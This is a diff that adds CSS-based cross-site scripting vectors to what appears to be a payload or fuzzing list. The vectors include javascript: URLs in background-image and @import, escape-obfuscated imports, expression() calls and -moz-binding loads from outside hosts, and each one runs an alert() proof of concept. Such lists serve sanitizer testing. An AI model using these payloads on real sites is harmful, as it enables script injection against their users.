@@ -50,3 +50,13 @@ style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
 <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
 <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<div style="background-image:url(javascript:alert(1))">
+<div style="background-image:url(&#1;javascript:alert(1))">
+<style>@import'javascript:alert(1)';</style>
+<style>.x{background-image:url("javascript:alert(1)")}</style><div class=x></div>
+<style>@im\port'\ja\vasc\ript:alert(1)';</style>
+<div style="width:expression(alert(1))"></div>
+<style>body{-moz-binding:url('http://example.com/xssmoz.xml#xss')}</style>
+<img style="xss:expr/*XSS*/ession(alert(1))">
+<xss style="xss:expression(alert(1))"></xss>
+
